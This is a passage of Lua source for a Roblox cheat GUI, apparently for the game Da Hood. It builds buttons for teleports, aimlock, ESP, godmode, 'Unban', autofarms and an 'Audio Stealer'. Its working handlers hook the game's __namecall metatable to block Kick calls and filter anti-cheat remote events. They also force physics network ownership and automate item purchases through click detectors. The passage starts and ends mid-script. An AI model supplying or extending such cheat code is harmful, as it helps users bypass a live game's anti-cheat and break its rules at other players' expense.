        aG.Size = UDim2.new(0, 316, 0, 325)
        aG.Visible = false
        aH.Name = "GunShop2"
        aH.Parent = aG
        aH.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aH.BorderSizePixel = 0
        aH.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
        aH.Size = UDim2.new(0, 94, 0, 46)
        aH.Font = Enum.Font.GothamBlack
        aH.Text = "GunShop(UP)"
        aH.TextColor3 = Color3.fromRGB(255, 0, 0)
        aH.TextSize = 14.000
        aI.Name = "PrevPosition"
        aI.Parent = aG
        aI.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aI.BorderSizePixel = 0
        aI.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
        aI.Size = UDim2.new(0, 94, 0, 46)
        aI.Font = Enum.Font.GothamBlack
        aI.Text = "PrevPos"
        aI.TextColor3 = Color3.fromRGB(255, 0, 0)
        aI.TextSize = 14.000
        aJ.Name = "Bank"
        aJ.Parent = aG
        aJ.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aJ.BorderSizePixel = 0
        aJ.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
        aJ.Size = UDim2.new(0, 94, 0, 46)
        aJ.Font = Enum.Font.GothamBlack
        aJ.Text = "Bank"
        aJ.TextColor3 = Color3.fromRGB(255, 0, 0)
        aJ.TextSize = 14.000
        aK.Name = "SafeZone1"
        aK.Parent = aG
        aK.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aK.BorderSizePixel = 0
        aK.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
        aK.Size = UDim2.new(0, 94, 0, 46)
        aK.Font = Enum.Font.GothamBlack
        aK.Text = "Safe Zone #1"
        aK.TextColor3 = Color3.fromRGB(255, 0, 0)
        aK.TextSize = 14.000
        aL.Name = "SetSpawn"
        aL.Parent = aG
        aL.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aL.BorderSizePixel = 0
        aL.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
        aL.Size = UDim2.new(0, 94, 0, 46)
        aL.Font = Enum.Font.GothamBlack
        aL.Text = "SetSpawn"
        aL.TextColor3 = Color3.fromRGB(255, 0, 0)
        aL.TextSize = 14.000
        aM.Name = "Sewer"
        aM.Parent = aG
        aM.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aM.BorderSizePixel = 0
        aM.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
        aM.Size = UDim2.new(0, 94, 0, 46)
        aM.Font = Enum.Font.GothamBlack
        aM.Text = "Sewer"
        aM.TextColor3 = Color3.fromRGB(255, 0, 0)
        aM.TextSize = 14.000
        aN.Name = "Playground"
        aN.Parent = aG
        aN.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aN.BorderSizePixel = 0
        aN.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
        aN.Size = UDim2.new(0, 94, 0, 46)
        aN.Font = Enum.Font.GothamBlack
        aN.Text = "Playground"
        aN.TextColor3 = Color3.fromRGB(255, 0, 0)
        aN.TextSize = 14.000
        aO.Name = "GasStation"
        aO.Parent = aG
        aO.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aO.BorderSizePixel = 0
        aO.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
        aO.Size = UDim2.new(0, 94, 0, 46)
        aO.Font = Enum.Font.GothamBlack
        aO.Text = "GasStation"
        aO.TextColor3 = Color3.fromRGB(255, 0, 0)
        aO.TextSize = 14.000
        aP.Name = "LavaBase"
        aP.Parent = aG
        aP.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aP.BorderSizePixel = 0
        aP.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
        aP.Size = UDim2.new(0, 94, 0, 46)
        aP.Font = Enum.Font.GothamBlack
        aP.Text = "LavaBase"
        aP.TextColor3 = Color3.fromRGB(255, 0, 0)
        aP.TextSize = 14.000
        aQ.Name = "SavePos"
        aQ.Parent = aG
        aQ.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aQ.BorderSizePixel = 0
        aQ.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
        aQ.Size = UDim2.new(0, 94, 0, 46)
        aQ.Font = Enum.Font.GothamBlack
        aQ.Text = "SavePos"
        aQ.TextColor3 = Color3.fromRGB(255, 0, 0)
        aQ.TextSize = 14.000
        aR.Name = "SafeZone2"
        aR.Parent = aG
        aR.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aR.BorderSizePixel = 0
        aR.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
        aR.Size = UDim2.new(0, 94, 0, 46)
        aR.Font = Enum.Font.GothamBlack
        aR.Text = "Safe Zone #2"
        aR.TextColor3 = Color3.fromRGB(255, 0, 0)
        aR.TextSize = 14.000
        aS.Name = "UFO"
        aS.Parent = aG
        aS.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aS.BorderSizePixel = 0
        aS.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
        aS.Size = UDim2.new(0, 94, 0, 46)
        aS.Font = Enum.Font.GothamBlack
        aS.Text = "UFO"
        aS.TextColor3 = Color3.fromRGB(255, 0, 0)
        aS.TextSize = 14.000
        aT.Name = "TacoShop"
        aT.Parent = aG
        aT.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aT.BorderSizePixel = 0
        aT.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
        aT.Size = UDim2.new(0, 94, 0, 46)
        aT.Font = Enum.Font.GothamBlack
        aT.Text = "TacoShop"
        aT.TextColor3 = Color3.fromRGB(255, 0, 0)
        aT.TextSize = 14.000
        aU.Name = "LoadPos"
        aU.Parent = aG
        aU.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aU.BorderSizePixel = 0
        aU.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
        aU.Size = UDim2.new(0, 94, 0, 46)
        aU.Font = Enum.Font.GothamBlack
        aU.Text = "LoadPos"
        aU.TextColor3 = Color3.fromRGB(255, 0, 0)
        aU.TextSize = 14.000
        aV.Name = "GunShop1"
        aV.Parent = aG
        aV.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aV.BorderSizePixel = 0
        aV.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
        aV.Size = UDim2.new(0, 94, 0, 46)
        aV.Font = Enum.Font.GothamBlack
        aV.Text = "GunShop(AK)"
        aV.TextColor3 = Color3.fromRGB(255, 0, 0)
        aV.TextSize = 14.000
        aW.Name = "SideScriptsFrame"
        aW.Parent = ap
        aW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        aW.BackgroundTransparency = 1.000
        aW.Size = UDim2.new(0, 316, 0, 325)
        aW.Visible = false
        aX.Name = "Aimlock"
        aX.Parent = aW
        aX.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aX.BorderSizePixel = 0
        aX.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
        aX.Size = UDim2.new(0, 94, 0, 46)
        aX.Font = Enum.Font.GothamBlack
        aX.Text = "Aimlock"
        aX.TextColor3 = Color3.fromRGB(255, 0, 0)
        aX.TextSize = 14.000
        aY.Name = "Users"
        aY.Parent = aW
        aY.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aY.BorderSizePixel = 0
        aY.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
        aY.Size = UDim2.new(0, 94, 0, 46)
        aY.Font = Enum.Font.GothamBlack
        aY.Text = "Users"
        aY.TextColor3 = Color3.fromRGB(255, 0, 0)
        aY.TextSize = 14.000
        aZ.Name = "MoneyESP"
        aZ.Parent = aW
        aZ.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        aZ.BorderSizePixel = 0
        aZ.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
        aZ.Size = UDim2.new(0, 94, 0, 46)
        aZ.Font = Enum.Font.GothamBlack
        aZ.Text = "MoneyESP"
        aZ.TextColor3 = Color3.fromRGB(255, 0, 0)
        aZ.TextSize = 14.000
        a_.Name = "FullGod"
        a_.Parent = aW
        a_.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        a_.BorderSizePixel = 0
        a_.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
        a_.Size = UDim2.new(0, 94, 0, 46)
        a_.Font = Enum.Font.GothamBlack
        a_.Text = "Benx"
        a_.TextColor3 = Color3.fromRGB(255, 0, 0)
        a_.TextSize = 14.000
        b0.Name = "Autofarm"
        b0.Parent = aW
        b0.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b0.BorderSizePixel = 0
        b0.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
        b0.Size = UDim2.new(0, 94, 0, 46)
        b0.Font = Enum.Font.GothamBlack
        b0.Text = "Autofarm"
        b0.TextColor3 = Color3.fromRGB(255, 0, 0)
        b0.TextSize = 14.000
        b1.Name = "HighTool"
        b1.Parent = aW
        b1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b1.BorderSizePixel = 0
        b1.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
        b1.Size = UDim2.new(0, 94, 0, 46)
        b1.Font = Enum.Font.GothamBlack
        b1.Text = "High Tool"
        b1.TextColor3 = Color3.fromRGB(255, 0, 0)
        b1.TextSize = 14.000
        b2.Name = "Esp"
        b2.Parent = aW
        b2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b2.BorderSizePixel = 0
        b2.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
        b2.Size = UDim2.new(0, 94, 0, 46)
        b2.Font = Enum.Font.GothamBlack
        b2.Text = "Esp"
        b2.TextColor3 = Color3.fromRGB(255, 0, 0)
        b2.TextSize = 14.000
        b3.Name = "LastingBullets"
        b3.Parent = aW
        b3.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b3.BorderSizePixel = 0
        b3.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
        b3.Size = UDim2.new(0, 94, 0, 46)
        b3.Font = Enum.Font.GothamBlack
        b3.Text = "LastingBullets"
        b3.TextColor3 = Color3.fromRGB(255, 0, 0)
        b3.TextSize = 14.000
        b4.Name = "Stamina"
        b4.Parent = aW
        b4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b4.BorderSizePixel = 0
        b4.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
        b4.Size = UDim2.new(0, 94, 0, 46)
        b4.Font = Enum.Font.GothamBlack
        b4.Text = "Stamina"
        b4.TextColor3 = Color3.fromRGB(255, 0, 0)
        b4.TextSize = 14.000
        b5.Name = "Spin"
        b5.Parent = aW
        b5.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b5.BorderSizePixel = 0
        b5.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
        b5.Size = UDim2.new(0, 94, 0, 46)
        b5.Font = Enum.Font.GothamBlack
        b5.Text = "Spin"
        b5.TextColor3 = Color3.fromRGB(255, 0, 0)
        b5.TextSize = 14.000
        b6.Name = "Unban"
        b6.Parent = aW
        b6.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b6.BorderSizePixel = 0
        b6.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
        b6.Size = UDim2.new(0, 94, 0, 46)
        b6.Font = Enum.Font.GothamBlack
        b6.Text = "Unban"
        b6.TextColor3 = Color3.fromRGB(255, 0, 0)
        b6.TextSize = 14.000
        b7.Name = "SwagUsers"
        b7.Parent = aW
        b7.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b7.BorderSizePixel = 0
        b7.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
        b7.Size = UDim2.new(0, 94, 0, 46)
        b7.Font = Enum.Font.GothamBlack
        b7.Text = "$-T0P-$Users"
        b7.TextColor3 = Color3.fromRGB(255, 0, 0)
        b7.TextSize = 14.000
        b8.Name = "LockTools"
        b8.Parent = aW
        b8.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b8.BorderSizePixel = 0
        b8.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
        b8.Size = UDim2.new(0, 94, 0, 46)
        b8.Font = Enum.Font.GothamBlack
        b8.Text = "LockTools"
        b8.TextColor3 = Color3.fromRGB(255, 0, 0)
        b8.TextSize = 14.000
        b9.Name = "Invisible"
        b9.Parent = aW
        b9.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        b9.BorderSizePixel = 0
        b9.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
        b9.Size = UDim2.new(0, 94, 0, 46)
        b9.Font = Enum.Font.GothamBlack
        b9.Text = "Invisible"
        b9.TextColor3 = Color3.fromRGB(255, 0, 0)
        b9.TextSize = 14.000
        ba.Name = "InfTools"
        ba.Parent = aW
        ba.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        ba.BorderSizePixel = 0
        ba.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
        ba.Size = UDim2.new(0, 94, 0, 46)
        ba.Font = Enum.Font.GothamBlack
        ba.Text = "Animation Pack"
        ba.TextColor3 = Color3.fromRGB(255, 0, 0)
        ba.TextSize = 14.000
        bb.Name = "imiecreditsFrame"
        bb.Parent = ap
        bb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        bb.BackgroundTransparency = 1.000
        bb.Size = UDim2.new(0, 316, 0, 325)
        bb.Visible = false
        _G.AutoBox = false
        bc.Name = "Soon_2"
        bc.Parent = bb
        bc.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bc.BorderSizePixel = 0
        bc.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
        bc.Size = UDim2.new(0, 94, 0, 46)
        bc.Font = Enum.Font.GothamBlack
        bc.Text = "Auto-Box"
        bc.TextColor3 = Color3.fromRGB(255, 0, 0)
        bc.TextSize = 14.000
        bc.MouseButton1Down:Connect(
            function()
                if _G.AutoBox == true then
                    _G.AutoBox = false
                else
                    _G.AutoBox = true
                end
                while _G.AutoBox == true and game:GetService("RunService").Heartbeat:Wait() do
                    if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Combat") then
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):EquipTool(
                            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Combat")
                        )
                    end
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Combat") then
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Combat"):Activate()
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Combat"):Deactivate()
                    end
                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame =
                        game:GetService("Workspace").MAP.Map.ArenaBOX.PunchingBagInGame["pretty ransom"].CFrame *
                        CFrame.new(0, 0, 1)
                end
            end
        )
        bd.Name = "Soon_1"
        bd.Parent = bb
        bd.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bd.BorderSizePixel = 0
        bd.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
        bd.Size = UDim2.new(0, 94, 0, 46)
        bd.Font = Enum.Font.GothamBlack
        bd.Text = "Katana"
        bd.TextColor3 = Color3.fromRGB(255, 0, 0)
        bd.TextSize = 14.000
        bd.MouseButton1Down:Connect(
            function()
                repeat
                    wait()
                until game:IsLoaded()
                local p = getrawmetatable(game)
                setreadonly(p, false)
                local q = p.__namecall
                p.__namecall =
                    newcclosure(
                    function(self, ...)
                        local r = {...}
                        if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
                            if tostring(getcallingscript()) ~= "Framework" then
                                return
                            end
                        end
                        if not checkcaller() and getnamecallmethod() == "Kick" then
                            return
                        end
                        return q(self, unpack(r))
                    end
                )
                local ce = 0
                local cf = game:GetService("Players").LocalPlayer.Character
                function GetKnife()
                    wait(.1)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-680.2, 19.75, -254.97)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-115.495, 19.756, -453.45)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(33, 19.75, -184.6)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(243.495, 62, -450.5)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-103.53, 19.75, -220.21)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-581.775, 19.7549, -485.23)
                    wait(2)
                    cf.HumanoidRootPart.CFrame = CFrame.new(-399.655, 19.7552, -461.55)
                    wait(2)
                    ce = ce + 1
                end
                wait()
                local cg = cf.HumanoidRootPart.CFrame.X
                local ch = cf.HumanoidRootPart.CFrame.Y
                local ci = cf.HumanoidRootPart.CFrame.Z
                GetKnife()
                repeat
                    GetKnife()
                until ce == 1
                cf.HumanoidRootPart.CFrame = CFrame.new(cg, ch + 5, ci)
                wait(0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(1, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(3, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(4, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(5, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(5, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(6, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(7, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(8, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(9, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(10, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(11, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(12, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
                game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(13, 0, 0.1)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
                game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
            end
        )
        be.Name = "autoreload"
        be.Parent = bb
        be.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        be.BorderSizePixel = 0
        be.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
        be.Size = UDim2.new(0, 94, 0, 46)
        be.Font = Enum.Font.GothamBlack
        be.Text = "Audio Stealer"
        be.TextColor3 = Color3.fromRGB(255, 0, 0)
        be.TextSize = 14.000
        be.MouseButton1Down:Connect(
            function()
                for s, O in pairs(GetPlayer(am)) do
                    if game:GetService("Players")[O].Character:WaitForChild("LowerTorso"):FindFirstChild("BOOMBOXSOUND") then
                        local cj =
                            game:GetService("Players")[O].Character:WaitForChild("LowerTorso"):FindFirstChild(
                            "BOOMBOXSOUND"
                        )
                        local L = string.split(tostring(cj.SoundId), "//")
                        if syn then
                            setclipboard(L[2])
                            cb("Audio Copied To Clipboard (" .. L[2] .. ")", 15)
                        else
                            cb("Audio Stealer : " .. L[2], 15)
                        end
                    end
                end
            end
        )
        bf.Name = "AutoClicker"
        bf.Parent = bb
        bf.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bf.BorderSizePixel = 0
        bf.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
        bf.Size = UDim2.new(0, 94, 0, 46)
        bf.Font = Enum.Font.GothamBlack
        bf.Text = "AutoClicker[v]"
        bf.TextColor3 = Color3.fromRGB(255, 0, 0)
        bf.TextSize = 14.000
        bf.MouseButton1Down:Connect(
            function()
                local u = game:GetService("Players").LocalPlayer
                local ck = u:GetMouse()
                local cl = false
                ck.KeyDown:Connect(
                    function(cm)
                        if cm == "v" then
                            cl = not cl
                            if cl == true then
                                repeat
                                    mouse1click()
                                    wait(0.001)
                                until cl == false
                            end
                        end
                    end
                )
            end
        )
        bg.Name = "zoomzoom"
        bg.Parent = bb
        bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bg.BorderSizePixel = 0
        bg.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
        bg.Size = UDim2.new(0, 94, 0, 46)
        bg.Font = Enum.Font.GothamBlack
        bg.Text = "Inf-Zoom"
        bg.TextColor3 = Color3.fromRGB(255, 0, 0)
        bg.TextSize = 14.000
        bg.MouseButton1Down:Connect(
            function()
                game.Players.LocalPlayer.CameraMaxZoomDistance = 9999999999999999999999
            end
        )
        bh.Name = "noclipreal"
        bh.Parent = bb
        bh.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bh.BorderSizePixel = 0
        bh.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
        bh.Size = UDim2.new(0, 94, 0, 46)
        bh.Font = Enum.Font.GothamBlack
        bh.Text = "Cash Float"
        bh.TextColor3 = Color3.fromRGB(255, 0, 0)
        bh.TextSize = 14.000
        bh.MouseButton1Down:Connect(
            function()
                spawn(
                    function()
                        repeat
                            game:GetService("RunService").Heartbeat:wait()
                            settings().Physics.AllowSleep = false
                            settings().Physics.ThrottleAdjustTime = math.huge - math.huge
                            setsimulationradius(1e9, 1e9)
                            game:GetService("RunService").Stepped:wait()
                        until nil
                    end
                )
                local function cn(co)
                    if co:FindFirstChild("BodyForce") then
                        return
                    end
                    local cp = Instance.new("BodyForce")
                    cp.Force = co:GetMass() * Vector3.new(0, workspace.Gravity, 0)
                    cp.Parent = co
                end
                for s, O in ipairs(workspace:GetDescendants()) do
                    if O:IsA("Part") and O.Anchored == false then
                        if not O:IsDescendantOf(game.Players.LocalPlayer.Character) then
                            cn(O)
                        end
                    end
                end
                workspace.DescendantAdded:Connect(
                    function(co)
                        if co:IsA("Part") and co.Anchored == false then
                            if not co:IsDescendantOf(game.Players.LocalPlayer.Character) then
                                cn(co)
                            end
                        end
                    end
                )
            end
        )
        bi.Name = "AutoSkinny"
        bi.Parent = bb
        bi.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bi.BorderSizePixel = 0
        bi.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
        bi.Size = UDim2.new(0, 94, 0, 46)
        bi.Font = Enum.Font.GothamBlack
        bi.Text = "Skinny-Farm"
        bi.TextColor3 = Color3.fromRGB(255, 0, 0)
        bi.TextSize = 14.000
        bi.MouseButton1Down:Connect(
            function()
                while true do
                    wait()
                    if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
                        wait()
                        local cq = game.Workspace.Ignored.Shop["[Lettuce] - $5"]
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            cq.Head.CFrame + Vector3.new(0, 3, 0)
                        if
                            (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - cq.Head.Position).Magnitude <=
                                50
                         then
                            wait(.2)
                            fireclickdetector(cq:FindFirstChild("ClickDetector"), 4)
                        end
                    end
                    if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
                        tool = game.Players.LocalPlayer.Backpack:WaitForChild("[Lettuce]")
                        tool.Parent = game.Players.LocalPlayer.Character
                    end
                    game:GetService("VirtualUser"):ClickButton1(Vector2.new())
                    local z = Vector3.new(-1006.99, -51.1542, -1014.33)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(z)
                end
            end
        )
        bj.Name = "AutoMuscle"
        bj.Parent = bb
        bj.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bj.BorderSizePixel = 0
        bj.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
        bj.Size = UDim2.new(0, 94, 0, 46)
        bj.Font = Enum.Font.GothamBlack
        bj.Text = "Muscle-Farm"
        bj.TextColor3 = Color3.fromRGB(255, 0, 0)
        bj.TextSize = 14.000
        bj.MouseButton1Down:Connect(
            function()
                while true do
                    wait()
                    if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
                        wait()
                        local cq = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            cq.Head.CFrame + Vector3.new(0, 3, 0)
                        if
                            (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - cq.Head.Position).Magnitude <=
                                50
                         then
                            wait(.2)
